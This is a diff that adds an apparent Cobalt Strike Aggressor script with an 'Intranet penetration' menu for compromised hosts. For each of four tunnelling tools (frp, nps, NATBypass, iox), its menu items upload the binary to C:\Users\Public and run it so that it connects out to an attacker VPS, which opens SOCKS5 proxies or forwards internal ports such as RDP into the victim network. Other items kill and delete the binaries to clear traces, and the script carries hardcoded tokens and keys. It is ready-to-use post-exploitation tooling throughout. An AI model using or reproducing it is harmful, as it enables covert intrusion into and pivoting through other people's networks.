@@ -1,0 +1,185 @@
+menu "Intranet penetration" {
+menu "frpModify" {
+item "Upload frpc" {
+$bid = $1;
+$dialog = dialog("Upload frpc", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &frp_upload);
+dialog_description($dialog,"frp specified parameter version (no need to implement frpc.ini). Project address: https://github.com/uknowsec/frpModify");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub frp_upload {
+bcd($bid, $3['UploadPath']);
+bupload($bid, script_resource("/scripts/Intranet agent/frpcx.exe"));
+}
+item "Run frpc"{
+$bid = $1['@'];
+$Dialog = dialog("Run frpc",%(ip => "x.x.x.x", port => "2333",bid => $bid),&frpc_run);
+dialog_description($Dialog, "Run frpc, use frpModify, specify parameters, token is: uknowsec, socks5 port is 23333.");
+drow_text($Dialog, "ip", "ip: ");
+drow_text($Dialog, "port", "port: ");
+dbutton_action($Dialog, "Run");
+dialog_show($Dialog);
+}
+sub frpc_run{
+local('$Name $port');
+$Name = $3['ip'];
+$port = replace($3['port'], "\"", "");
+bshell($bid, "frpcx.exe -t $+ $Name -p $+ $port");
+}
+item "Stop frpc"{
+local('$bid');
+foreach $bid ($1){
+bshell($1, "taskkill -f /im frpcx.exe");
+}
+}
+item "Delete frpc"{
+local('$bid');
+foreach $bid ($1){
+bshell($1, "taskkill -f /im frpcx.exe & del /f /s /q frpcx.exe");
+}
+}
+}
+menu "nps" {
+item "Upload npc" {
+$bid = $1;
+$dialog = dialog("Upload npc", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &npc_upload);
+dialog_description($dialog,"A lightweight, high-performance, powerful intranet penetration proxy server. Supports almost all traffic forwarding such as tcp, udp, socks5, http, etc. Reference: https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg. Project address: https://github.com/ehang-io/nps");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub npc_upload {
+bcd($bid, $3['UploadPath']);
+bupload($bid, script_resource("/scripts/Intranet agent/npc.exe"));
+}
+item "Run npc"{
+$bid = $1['@'];
+$Dialog = dialog("Run npc",%(server => "ip:8024", vkey => "",bid => $bid),&npc_run);
+dialog_description($Dialog, "Run NPC, no configuration file, use reference: https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg.");
+drow_text($Dialog, "server", "server: ");
+drow_text($Dialog, "vkey", "vkey: ");
+dbutton_action($Dialog, "Run");
+dialog_show($Dialog);
+}
+sub npc_run{
+local('$server $vkey');
+$server = $3['server'];
+$vkey = replace($3['vkey'], "\"", "");
+bshell($bid, "npc.exe -server= $+ $server -vkey= $+ $vkey");
+}
+item "Stop NPC"{
+local('$bid');
+foreach $bid ($1){
+bshell($1, "taskkill -f /im npc.exe");
+}
+}
+item "Delete npc"{
+local('$bid');
+foreach $bid ($1){
+bshell($1, "taskkill -f /im npc.exe & del /f /s /q npc.exe");
+}
+}
+}
+
+menu "NATBypass (port forwarding)" {
+item "Upload nb" {
+$bid = $1;
+$dialog = dialog("Upload nb", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &nb);
+dialog_description($dialog,"An implementation of lcx in golang. Project address: https://github.com/cw1997/NATBypass");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub nb {
+bcd($bid, $3['UploadPath']);
+bupload($bid, script_resource("/scripts/Intranet agent/nb.exe"));
+}
+		item "Run nb"{
+$bid = $1['@'];
+$Dialog = dialog("Run nb",%(lhost => "127.0.0.1:3389", rhost => "x.x.x.x:1997",bid => $bid),&nb_run);
+dialog_description($Dialog, "vps run: ./nb -listen 1997 2017");
+drow_text($Dialog, "lhost", "Local IP:Port");
+drow_text($Dialog, "rhost", "Public IP:Port");
+dbutton_action($Dialog, "Run");
+dialog_show($Dialog);
+}
+sub nb_run{
+local('$lhost $rhost');
+$lhost = $3['lhost'];
+$rhost = replace($3['rhost'], "\"", "");
+bshell($bid, "nb.exe -slave $+ $lhost $+ $rhost");
+}
+item "Stop nb"{
+local('$bid');
+foreach $bid ($1){
+bshell($1, "taskkill -f /im nb.exe");
+}
+}
+item "Delete nb"{
+local('$bid');
+foreach $bid ($1){
+bshell($1, "taskkill -f /im nb.exe & del /f /s /q nb.exe");
+}
+}
+}
+
+menu "iox (port forwarding and socks5)" {
+item "Upload iox" {
+$bid = $1;
+$dialog = dialog("Upload iox", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &iox);
+dialog_description($dialog,"Port forwarding tool and socks5 proxy. Project address: https://github.com/EddieIvan01/iox");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub iox {
+bcd($bid, $3['UploadPath']);
+bupload($bid, script_resource("/scripts/Intranet agent/iox.exe"));
+}
+item "Run iox(fwd)"{
+$bid = $1['@'];
+$Dialog = dialog("Run iox",%(lhost => "192.168.0.100:3389", rhost => "*x.x.x.x:3389", hex => "656565",bid => $bid),&iox_fwdrun);
+dialog_description($Dialog, "vps run: ./iox fwd -l *3389 -l 33890 -k 656565");
+drow_text($Dialog, "lhost", "local IP:Port");
+drow_text($Dialog, "rhost", "public IP:Port");
+drow_text($Dialog, "hex", "traffic encryption key: ");
+dbutton_action($Dialog, "Run");
+dialog_show($Dialog);
+}
+		sub iox_fwdrun{
+local('$lhost $rhost $hex');
+$lhost = $3['lhost'];
+$rhost = replace($3['rhost'], "\"", "");
+$hex = $3['hex'];
+bshell($bid, "iox.exe fwd -r $+ $lhost -r $+ $rhost -k $+ $hex");
+}
+
+item "Run iox(proxy)"{
+$bid = $1['@'];
+$Dialog = dialog("Run iox",%(rhost => "*x.x.x.x:9999", hex => "000102",bid => $bid),&iox_proxyrun);
+dialog_description($Dialog, "vps first establishes a service: ./iox proxy -l *9999 -l 1080 -k 000102");
+drow_text($Dialog, "rhost", "Public IP:Port");
+drow_text($Dialog, "hex", "Traffic encryption key: ");
+dbutton_action($Dialog, "Run");
+dialog_show($Dialog);
+}
+sub iox_proxyrun{
+local('$rhost $hex');
+$rhost = $3['rhost'];
+$hex = replace($3['hex'], "\"", "");
+bshell($bid, "iox.exe proxy -r $+ $rhost -k $+ $hex");
+}
+
+item "Stop iox"{
+local('$bid');
+foreach $bid ($1){
+bshell($1, "taskkill -f /im iox.exe");
+}
+}
+item "Delete iox"{
+local('$bid');
+foreach $bid ($1){ bshell($1, "taskkill -f /im iox.exe & del /f /s /q iox.exe"); } }
+	}
+
+}
